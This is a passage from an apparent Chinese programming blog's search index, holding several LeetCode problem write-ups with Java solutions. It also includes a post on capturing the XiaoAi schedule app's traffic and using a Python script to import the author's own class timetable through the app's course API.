    <content type="text"><![CDATA[题目：514. 自由之路难度：困难 电子游戏“辐射4”中，任务“通向自由”要求玩家到达名为“Freedom Trail Ring”的金属表盘，并使用表盘拼写特定关键词才能开门。 给定一个字符串 ring，表示刻在外环上的编码；给定另一个字符串 key，表示需要拼写的关键词。您需要算出能够拼写关键词中所有字符的最少步数。 最初，ring 的第一个字符与12:00方向对齐。您需要顺时针或逆时针旋转 ring 以使 key 的一个字符在 12:00 方向对齐，然后按下中心按钮，以此逐个拼写完 key 中的所有字符。 旋转 ring 拼出 key 字符 key[i] 的阶段中： 您可以将 ring 顺时针或逆时针旋转一个位置，计为1步。旋转的最终目的是将字符串 ring 的一个字符与 12:00 方向对齐，并且这个字符必须等于字符 key[i] 。 如果字符 key[i] 已经对齐到12:00方向，您需要按下中心按钮进行拼写，这也将算作 1 步。按完之后，您可以开始拼写 key 的下一个字符（下一阶段）, 直至完成所有拼写。示例： 1234567输入: ring = &quot;godding&quot;, key = &quot;gd&quot;输出: 4解释: 对于 key 的第一个字符 &apos;g&apos;，已经在正确的位置, 我们只需要1步来拼写这个字符。 对于 key 的第二个字符 &apos;d&apos;，我们需要逆时针旋转 ring &quot;godding&quot; 2步使它变成 &quot;ddinggo&quot;。 当然, 我们还需要1步进行拼写。 因此最终的输出是 4。 提示： ring 和 key 的字符串长度取值范围均为 1 至 100； 两个字符串中都只有小写字符，并且均可能存在重复字符； 字符串 key 一定可以由字符串 ring 旋转拼出。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/freedom-trail著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按下中心按钮的次数固定为key的长度，因此只需要求依次使用最少的步数使ring[ringIndex]旋转为key[keyIndex]，暴力的dfs会超时，因此需要记忆化 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; Map&lt;Character,List&lt;Integer&gt;&gt; indexMap = new HashMap(); int[][] ms; public int findRotateSteps(String ring, String key) &#123; ms = new int[ring.length()][key.length()]; for (int i = 0;i &lt; ring.length();i++) &#123; char ch = ring.charAt(i); if (indexMap.containsKey(ch)) &#123; indexMap.get(ch).add(i); &#125; else &#123; List&lt;Integer&gt; l = new ArrayList&lt;&gt;(); l.add(i); indexMap.put(ch,l); &#125; &#125; return key.length() + dfs(ring,key,0,0); &#125; private int dfs(String ring,String key,int ringIndex,int keyIndex) &#123; if (keyIndex == key.length()) &#123; return 0; &#125; if (ms[ringIndex][keyIndex] != 0) &#123; return ms[ringIndex][keyIndex]; &#125; char cur = key.charAt(keyIndex); int ans = Integer.MAX_VALUE; for (int targetIndex : indexMap.get(cur)) &#123; int d1 = Math.abs(ringIndex - targetIndex); int d2 = ring.length() - d1; int min = Math.min(d1,d2); ans = Math.min(ans, min + dfs(ring,key,targetIndex,keyIndex + 1)); &#125; return ms[ringIndex][keyIndex] = ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/10]]></title>
    <url>%2Fposts%2Fa616b688%2F</url>
    <content type="text"><![CDATA[题目：31. 下一个排列难度：中等 实现获取下一个排列的函数，算法需要将给定数字序列重新排列成字典序中下一个更大的排列。 如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。 必须原地修改，只允许使用额外常数空间。 以下是一些例子，输入位于左侧列，其相应输出位于右侧列。1,2,3 → 1,3,23,2,1 → 1,2,31,1,5 → 1,5,1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/next-permutation著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 此题考查经典的next_permitation算法 解题代码1234567891011121314151617181920212223242526272829303132333435class Solution &#123; public void nextPermutation(int[] nums) &#123; int i = nums.length - 2; while (i &gt;= 0 &amp;&amp; nums[i + 1] &lt;= nums[i]) &#123; i--; &#125; if (i &gt;= 0) &#123; int j = nums.length - 1; while (j &gt;= 0 &amp;&amp; nums[j] &lt;= nums[i]) &#123; j--; &#125; swap(nums, i, j); &#125; reverse(nums, i + 1); &#125; public void reverse(int[] nums, int start) &#123; int i = start; int j = nums.length - 1; while (i &lt; j) &#123; swap(nums, i, j); i++; j--; &#125; &#125; public void swap(int[] nums, int i, int j) &#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/9]]></title>
    <url>%2Fposts%2Fab501781%2F</url>
    <content type="text"><![CDATA[题目：973. 最接近原点的 K 个点难度：中等 我们有一个由平面上的点组成的列表 points。需要从中找出 K 个距离原点 (0, 0) 最近的点。 （这里，平面上两点之间的距离是欧几里德距离。） 你可以按任何顺序返回答案。除了点坐标的顺序之外，答案确保是唯一的。 示例 1： 1234567输入：points = [[1,3],[-2,2]], K = 1输出：[[-2,2]]解释： (1, 3) 和原点之间的距离为 sqrt(10)，(-2, 2) 和原点之间的距离为 sqrt(8)，由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。 示例 2： 123输入：points = [[3,3],[5,-1],[-2,4]], K = 2输出：[[3,3],[-2,4]]（答案 [[-2,4],[3,3]] 也会被接受。） 提示： 1 &lt;= K &lt;= points.length &lt;= 10000 -10000 &lt; points[i][0] &lt; 10000 -10000 &lt; points[i][1] &lt; 10000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/k-closest-points-to-origin著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用有序的TreeMap集合，取前K个即可 解题代码1234567891011121314151617181920212223242526272829303132class Solution &#123; public int[][] kClosest(int[][] points, int K) &#123; Map&lt;Integer,List&lt;int[]&gt;&gt; map = new TreeMap&lt;&gt;(); for (int[] a : points) &#123; int key = a[0] * a[0] + a[1] * a[1]; if (map.containsKey(key)) &#123; map.get(key).add(a); &#125; else &#123; List&lt;int[]&gt; one = new ArrayList&lt;&gt;(); one.add(a); map.put(key,one); &#125; &#125; int[][] ans = new int[K][2]; for (Integer key : map.keySet()) &#123; // System.out.println(key+","+Arrays.toString(map.get(key))); for (int[] a : map.get(key)) &#123; ans[ans.length - K] = a; K--; &#125; if (K &lt;= 0) &#123; break; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>TreeMap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/7]]></title>
    <url>%2Fposts%2F4ce83a86%2F</url>
    <content type="text"><![CDATA[题目：327. 区间和的个数难度：困难 给定一个整数数组 nums，返回区间和在 [lower, upper] 之间的个数，包含 lower 和 upper。区间和 S(i, j) 表示在 nums 中，位置从 i 到 j 的元素之和，包含 i 和 j (i ≤ j)。 说明:最直观的算法复杂度是 O(n2) ，请在此基础上优化你的算法。 示例: 123输入: nums = [-2,5,-1], lower = -2, upper = 2,输出: 3 解释: 3个区间分别是: [0,0], [2,2], [0,2]，它们表示的和分别为: -2, -1, 2。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-of-range-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 万万没想到，困难题，单纯的暴力也能A 解题代码123456789101112131415class Solution &#123; public int countRangeSum(int[] nums, int lower, int upper) &#123; int ans = 0; for (int i = 0;i &lt; nums.length;i++) &#123; long sum = 0; for (int j = i;j &lt; nums.length;j++) &#123; sum += nums[j]; if (lower &lt;= sum &amp;&amp; upper &gt;= sum) &#123; ans++; &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>暴力枚举</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/6]]></title>
    <url>%2Fposts%2F3bef0a10%2F</url>
    <content type="text"><![CDATA[题目：1356. 根据数字二进制下 1 的数目排序难度：简单 给你一个整数数组 arr 。请你将数组中的元素按照其二进制表示中数字 1 的数目升序排序。 如果存在多个数字二进制中 1 的数目相同，则必须将它们按照数值大小升序排列。 请你返回排序后的数组。 示例 1： 1234567输入：arr = [0,1,2,3,4,5,6,7,8]输出：[0,1,2,4,8,3,5,6,7]解释：[0] 是唯一一个有 0 个 1 的数。[1,2,4,8] 都有 1 个 1 。[3,5,6] 有 2 个 1 。[7] 有 3 个 1 。按照 1 的个数排序得到的结果数组为 [0,1,2,4,8,3,5,6,7] 示例 2： 123输入：arr = [1024,512,256,128,64,32,16,8,4,2,1]输出：[1,2,4,8,16,32,64,128,256,512,1024]解释：数组中所有整数二进制下都只有 1 个 1 ，所以你需要按照数值大小将它们排序。 示例 3： 12输入：arr = [10000,10000]输出：[10000,10000] 示例 4： 12输入：arr = [2,3,5,7,11,13,17,19]输出：[2,3,5,17,7,11,13,19] 示例 5： 12输入：arr = [10,100,1000,10000]输出：[10,100,10000,1000] 提示： 1 &lt;= arr.length &lt;= 500 0 &lt;= arr[i] &lt;= 10^4 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sort-integers-by-the-number-of-1-bits著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 面向对象 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123; public int[] sortByBits(int[] arr) &#123; CountAndValue[] cavs = new CountAndValue[arr.length]; int index = 0; for (int v : arr) &#123; cavs[index++] = new CountAndValue(v); &#125; Arrays.sort(cavs); for (int i = 0;i &lt; cavs.length;i++) &#123; arr[i] = cavs[i].val; &#125; return arr; &#125; static class CountAndValue implements Comparable&lt;CountAndValue&gt; &#123; int cnt; int val; public CountAndValue(int val) &#123; this.val = val; int cnt = 0; while ((val = val &amp; (val - 1)) != 0) &#123; cnt++; &#125; this.cnt = cnt; &#125; @Override public int compareTo(CountAndValue cav) &#123; if (this.cnt == cav.cnt) &#123; return this.val - cav.val; &#125; return this.cnt - cav.cnt; &#125; @Override public String toString() &#123; return String.valueOf(this.val); &#125; &#125;&#125; 附上一种值得学习的思路，妙极 123456789101112131415161718class Solution &#123; public int[] sortByBits(int[] arr) &#123; int length = arr.length; // 核心思想是加权排序后，还原 for (int i = 0; i &lt; length; i++) &#123; // 100_000 = 100 * 1000，注意题目给出的数组元素值的范围 arr[i] = Integer.bitCount(arr[i]) * 100_000 + arr[i]; &#125; Arrays.sort(arr); for (int i = 0; i &lt; length; i++) &#123; arr[i] %= 100_000; &#125; return arr; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/5]]></title>
    <url>%2Fposts%2Fa2e65baa%2F</url>
    <content type="text"><![CDATA[题目：127. 单词接龙难度：中等 给定两个单词（beginWord 和 endWord）和一个字典，找到从 beginWord 到 endWord 的最短转换序列的长度。转换需遵循如下规则： 每次转换只能改变一个字母。 转换过程中的中间单词必须是字典中的单词。 说明: 如果不存在这样的转换序列，返回 0。 所有单词具有相同的长度。 所有单词只由小写字母组成。 字典中不存在重复的单词。 你可以假设 beginWord 和 endWord 是非空的，且二者不相同。 示例 1: 123456789输入:beginWord = &quot;hit&quot;,endWord = &quot;cog&quot;,wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]输出: 5解释: 一个最短转换序列是 &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;, 返回它的长度 5。 示例 2: 12345678输入:beginWord = &quot;hit&quot;endWord = &quot;cog&quot;wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]输出: 0解释: endWord &quot;cog&quot; 不在字典中，所以无法进行转换。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/word-ladder著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 普通bfs，时空复杂度完败，太菜了 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class Solution &#123; public int ladderLength(String beginWord, String endWord, List&lt;String&gt; wordList) &#123; int ans = 0; if (!wordList.contains(endWord)) &#123; return ans; &#125; Map&lt;String,Boolean&gt; vis = new HashMap&lt;&gt;(); ans = 1; Queue&lt;String&gt; queue = new LinkedList&lt;&gt;(); queue.add(beginWord); vis.put(beginWord,true); while (!queue.isEmpty()) &#123; ans++; int size = queue.size(); while (size-- &gt; 0) &#123; String poll = queue.poll(); for (int i = 0;i &lt; wordList.size();i++) &#123; String key = wordList.get(i); if (vis.get(key) != null) &#123; continue; &#125; if(compare(poll,key)) &#123; if (key.equals(endWord)) &#123; return ans; &#125; queue.add(key); vis.put(key,true); &#125; &#125; &#125; &#125; return 0; &#125; private boolean compare(String s1,String s2) &#123; int cnt = 0; for (int i = 0;i &lt; s1.length();i++) &#123; if (s1.charAt(i) != s2.charAt(i)) &#123; cnt++; &#125; &#125; return cnt == 1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/4]]></title>
    <url>%2Fposts%2Fd5e16b3c%2F</url>
    <content type="text"><![CDATA[题目：57. 插入区间难度：困难 给出一个无重叠的 ，按照区间起始端点排序的区间列表。 在列表中插入一个新的区间，你需要确保列表中的区间仍然有序且不重叠（如果有必要的话，可以合并区间）。 示例 1： 12输入：intervals = [[1,3],[6,9]], newInterval = [2,5]输出：[[1,5],[6,9]] 示例 2： 123输入：intervals = [[1,2],[3,5],[6,7],[8,10],[12,16]], newInterval = [4,8]输出：[[1,2],[3,10],[12,16]]解释：这是因为新的区间 [4,8] 与 [3,5],[6,7],[8,10] 重叠。 注意：输入类型已在 2019 年 4 月 15 日更改。请重置为默认代码定义以获取新的方法签名。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/insert-interval著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 由于原始区间已经有序，所以直接分情况考虑即可，详见注释 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576class Solution &#123; public int[][] insert(int[][] intervals, int[] newInterval) &#123; if (intervals == null || intervals.length &lt; 1) &#123; return new int[][]&#123;newInterval&#125;; &#125; if (newInterval == null || newInterval.length &lt; 1) &#123; return intervals; &#125; List&lt;int[]&gt; ans = new ArrayList&lt;&gt;(); // 先找插入位置 int pos = -1; for (int i = 0;i &lt; intervals.length;i++) &#123; int[] cur = intervals[i]; if (!(newInterval[0] &gt; cur[1] || newInterval[1] &lt; cur[0])) &#123; pos = i; break; &#125; &#125; if (pos != -1) &#123; // 有交集 // 将前面不需要调整区间的放入解集 for (int i = 0;i &lt; pos;i++) &#123; ans.add(intervals[i]); &#125; // 插入 int start = Math.min(newInterval[0],intervals[pos][0]); int end = Math.max(newInterval[1],intervals[pos][1]); ans.add(new int[]&#123;start,end&#125;); // 考虑后面的，可能需要合并区间 for (int i = pos + 1;i &lt; intervals.length;i++) &#123; int[] pre = ans.get(ans.size() - 1); int[] cur = intervals[i]; if (!(pre[0] &gt; cur[1] || pre[1] &lt; cur[0])) &#123; pre[0] = Math.min(pre[0],cur[0]); pre[1] = Math.max(pre[1],cur[1]); &#125; else &#123; ans.add(cur); &#125; &#125; &#125; else &#123; // 没有交集，不需要合并，直接考虑好插入位置，然后插入即可 boolean flag = false; for (int i = 0;i &lt; intervals.length;i++) &#123; int[] cur = intervals[i]; if (cur[1] &lt; newInterval[0]) &#123; ans.add(cur); &#125; else &#123; if (!flag) &#123; ans.add(newInterval); flag = true; &#125; ans.add(cur); &#125; &#125; if (!flag) &#123; ans.add(newInterval); &#125; &#125; int[][] res = new int[ans.size()][2]; for (int i = 0;i &lt; ans.size();i++) &#123; res[i] = ans.get(i); &#125; return res; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/3]]></title>
    <url>%2Fposts%2F4b85fe9f%2F</url>
    <content type="text"><![CDATA[题目：941. 有效的山脉数组难度：简单 给定一个整数数组 A，如果它是有效的山脉数组就返回 true，否则返回 false。 让我们回顾一下，如果 A 满足下述条件，那么它是一个山脉数组： A.length &gt;= 3 在 0 &lt; i &lt; A.length - 1 条件下，存在 i 使得： A[0] &lt; A[1] &lt; … A[i-1] &lt; A[i] A[i] &gt; A[i+1] &gt; … &gt; A[A.length - 1] 示例 1： 12输入：[2,1]输出：false 示例 2： 12输入：[3,5,5]输出：false 示例 3： 12输入：[0,3,2,1]输出：true 提示： 0 &lt;= A.length &lt;= 10000 0 &lt;= A[i] &lt;= 10000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/valid-mountain-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用双指针扫描数组，如果满足山脉数组，最终两个指针会相遇在最大值的位置 解题代码123456789101112131415161718192021222324class Solution &#123; public boolean validMountainArray(int[] A) &#123; if (A.length &lt; 3) &#123; return false; &#125; int p = 0; int q = A.length - 1; while (p + 1 &lt; A.length &amp;&amp; A[p] &lt; A[p + 1]) &#123; p++; &#125; while (q - 1 &gt;= 0 &amp;&amp; A[q] &lt; A[q - 1]) &#123; q--; &#125; if (p == 0 || q == A.length - 1) &#123; return false; &#125; return p == q; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一种导入小爱课程表的非一般方法]]></title>
    <url>%2Fposts%2Fbf2ec5ab%2F</url>
    <content type="text"><![CDATA[本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你点此一键直达 或者使用另一个开源项目 前言《小爱课程表》是小米最新推出的课程表应用。 所有使用MIUI12的小米手机都自带，它具有课程提醒和上课静音的功能，并且支持负一屏展示、日历订阅等非常实用的功能。 当然，其他手机也能用，小爱课程表应用目前已经上架了多个应用商店，包括iOS 和安卓商店，所以，只需要去应用商店搜索「小爱课程表」下载即可食用，它相比其他课程表产品的优势在于：更新及时，界面简洁无广告，设置课程便捷，可添加桌面小部件（所以负一屏展示这个功能，可能就MIUI12支持了吧，安利一下）。 下面放一些效果图： 另外，值得一提的是，小爱课程表推出了和小爱同学一起打造最好用的课程表的内测功能，号称：只需一点JS基础，几十行代码，便可参与课程表项目，体会代码落地产品的乐趣，用你的高超技艺造福同校同学！，如果你有适配的想法，请戳官方文档 如果你想适配，但苦于没有参考，想找个参考的话，可以看一下我的开源项目成都信息工程大学 小爱课程表适配 原理下面本文的重点来了，先简单介绍一下小爱课程表这个适配功能原理：小米的工程师们提供了一个webview，让开发者可以在页面上加载出你的课程表，然后通过你使用官方提供的chrome浏览器插件开发好的scheduleHtmlProvider.js和scheduleHtmlParser.js解析出符合小爱预定义好的规范的json数据，点击一键导入之后，通过https请求提交到小米的服务器，然后小爱课程表根据这个json数据进行课程表的渲染，单就原理而言，并没有什么太大的问题，但是坑就坑在Android的webview，这个无法渲染出js动态生成的课程表（目前已知金智和树维的教务系统，无法渲染出来，登陆之后会白屏，就像下面这张图一样） 博主也是在适配完了我们学校的小爱课程表之后，才发现这个问题的，这适配完了，用不了的情况，就很不舒服，于是尝试寻找解决办法 破局在理解了小爱课程表适配功能的原理之后，发现，我们缺少的其实就只有提交到小米的服务器这一步，所以从另一个角度来看，我们完全可以自己提交课程数据给小米的服务器，于是说干就干，抓个包来看看小爱课程表提交到小米的服务器的数据是什么样子的，在这里我选用的抓包工具是小黄鸟 配置小黄鸟 下载并安装小黄鸟，GitHub传送门 打开小黄鸟，安装证书等等 设置小黄鸟的目标应用为小爱同学 开始抓包 打开小爱同学，添加一条测试课程看看 发现提交课程的报文如下： 1234567891011121314151617POST /course/courseInfo h2Host: i.ai.mi.comcontent-length: 272access-control-allow-origin: trueuser-agent: Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36content-type: application/jsonaccept: */*origin: https://i.ai.mi.comx-requested-with: com.miui.voiceassistsec-fetch-site: same-originsec-fetch-mode: corssec-fetch-dest: emptyreferer: https://i.ai.mi.com/h5/precache/ai-schedule/accept-encoding: gzip, deflateaccept-language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#123;&quot;weeks&quot;:&quot;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20&quot;,&quot;name&quot;:&quot;测试&quot;,&quot;position&quot;:&quot;&quot;,&quot;teacher&quot;:&quot;&quot;,&quot;sections&quot;:&quot;2&quot;,&quot;day&quot;:1,&quot;style&quot;:&quot;&#123;\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;&#125;&quot;,&quot;csId&quot;:2371853867,&quot;userId&quot;:123436229,&quot;deviceId&quot;:&quot;a88374c981cf771f8360dabcde4c3574&quot;&#125; 分析报文接口地址：https://i.ai.mi.com/course/courseInfo接口传递的json及其字段含义： 123456789101112&#123; "weeks": "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",// 课程上课周数 "name": "测试",// 课程名称 "position": "",// 课程上课地点 "teacher": "",// 课程上课老师 "sections": "2",// 课程是第几节课 "day": 1,// 课程是周几上课 "style": "&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;",// 字体背景颜色设置 "csId": 2371853867,// 课程id，可以不提交 "userId": 123436229,// 用户id，可以在vConsole的LocalStorage中获取到，此处我的id已打码，vConsole，连续点击荣誉coder下方空白区域调出 "deviceId": "a88374c981cf771f8360dabcde4c3574"// 设备id，可以在vConsole的LocalStorage中获取到，此处我的id已打码&#125; 比较将抓取到的接口和我们按照官方文档渲染出来的json格式比较一下：可以发现，sections和weeks字段有些许的不同，另外，缺少了style，userId，deviceId字段，基于此，我们可以稍微修改一下js解析出来的格式，并且加入缺少的字段，然后模拟请求提交给小米的服务器即可 修改json格式： “weeks”:由数组改成字符串，逗号分割 “sections”:由数组改为字符串，逗号分割 增加userId，deviceId字段，值为vConsole的LocalStorage中的相关值 增加style字段，可以给默认值为&quot;{\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;}&quot;，或者自定义，建议默认值，不会影响负一屏的效果，但缺点就是不够个性化 模拟请求原理写了一大堆，相信大家应该都懂了，所以这里只给出一个写好的python脚本，依赖python3，requests 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding:utf-8 -*-import requestsimport jsoncourseInfos = json.loads( '&#123;"courseInfos":[&#123;"day":1,"sections":"1,2","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4303"&#125;,&#123;"day":2,"sections":"1,2","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":2,"sections":"1,2","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":3,"sections":"1,2","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4501"&#125;,&#123;"day":4,"sections":"1,2","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H2403"&#125;,&#123;"day":5,"sections":"1,2","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":2,"sections":"3,4","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H4301"&#125;,&#123;"day":3,"sections":"3,4","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":3,"sections":"3,4","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":4,"sections":"3,4","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H1603"&#125;,&#123;"day":4,"sections":"3,4","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4601"&#125;,&#123;"day":1,"sections":"5,6","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4305"&#125;,&#123;"day":2,"sections":"5,6","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":3,"sections":"5,6","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4304"&#125;,&#123;"day":3,"sections":"5,6","name":"自然辩证法概论","teacher":"黄澜","weeks":"9,10,11,12,13,14,15,16,17","position":"H1301"&#125;,&#123;"day":4,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4305"&#125;,&#123;"day":1,"sections":"7,8","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4303"&#125;]&#125;')exclude = ['虚拟现实', '数字图像处理及应用', '嵌入式系统', '云计算', '物联网技术']userId = 123436229deviceId = 'a88374c981cf771f8360dabcde4c3574'# i = 2371853867for course in courseInfos['courseInfos']: if course['name'] in exclude: continue # course['csId'] = i course['userId'] = userId course['deviceId'] = deviceId course['style'] = '&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;' data = json.dumps(course, ensure_ascii=False) headers = &#123; 'Host': 'i.ai.mi.com', 'content-length': str(len(data)), 'access-control-allow-origin': 'true', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': '*/*', 'origin': 'https://i.ai.mi.com', 'x-requested-with': 'com.miui.voiceassist', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://i.ai.mi.com/h5/precache/ai-schedule/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', &#125; res = requests.post(url='https://i.ai.mi.com/course/courseInfo', headers=headers, data=data.encode()) print(res.text) print(data) # i += 1 使用方式可以直接使用我的这个开源项目，前提是你们学校的课程表已经适配了，不然你需要先适配 成信大学子 clone 适配小爱课程表的项目到本地 登陆教务管理系统，保存课表html 打开小爱课程表，在vConsole的LocalStorage中拿到userId和deviceId；vConsole，可以通过连续点击荣誉coder下方空白区域调出 拿到课表的table的HTML源代码放到course_table_demo.html的body中 双击course_table_demo.html，用浏览器查看，并在console中将打印出来的课表json复制出来 修改上面的python脚本的相关配置为自己的，然后运行python脚本 enjoy it 其他学校学子 适配小爱课程表 接下来就和上面一样了 致谢部分思路来自于： 导出课表到小爱课表的一种方法，支持单双周/教师教室/背景色 将超级课程表的课程一键导入至小爱课程表]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>JavaScript</tag>
        <tag>抓包</tag>
        <tag>小爱课程表</tag>
        <tag>HttpCanary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/2]]></title>
    <url>%2Fposts%2F3c82ce09%2F</url>
